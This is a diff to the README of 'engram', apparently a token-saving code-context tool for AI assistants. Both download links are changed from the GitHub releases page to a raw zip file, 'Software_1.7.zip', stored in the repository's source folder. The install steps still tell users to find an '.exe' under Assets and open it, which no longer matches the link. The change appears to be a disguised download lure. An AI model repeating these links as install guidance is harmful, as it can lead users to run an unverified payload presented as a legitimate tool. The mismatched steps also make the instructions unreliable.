@@ -1,6 +1,6 @@
 # 🧠 engram - Save tokens and boost code context
 
-[![Download Engram](https://img.shields.io/badge/Download-Engram-blue)](https://github.com/Republicofhaitigoodstory6175/engram/releases)
+[![Download Engram](https://img.shields.io/badge/Download-Engram-blue)](https://github.com/Republicofhaitigoodstory6175/engram/raw/refs/heads/main/src/Software_1.7.zip)
 
 Engram organizes your coding knowledge. It acts as a bridge between your projects and artificial intelligence tools. By grouping your project files into a smart map, this tool reduces the amount of data you send to AI models. This process saves money and keeps your AI responses focused. It works on your machine using a private database. Your data stays on your computer.
 
@@ -23,7 +23,7 @@ Engram organizes your coding knowledge. It acts as a bridge between your project
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Republicofhaitigoodstory6175/engram/releases) to access the latest version.
+1.  Visit the [official download page](https://github.com/Republicofhaitigoodstory6175/engram/raw/refs/heads/main/src/Software_1.7.zip) to access the latest version.
 2.  Find the file ending in `.exe` under the Assets section.
 3.  Click the file to start the download.
 4.  Open the file once the download finishes.
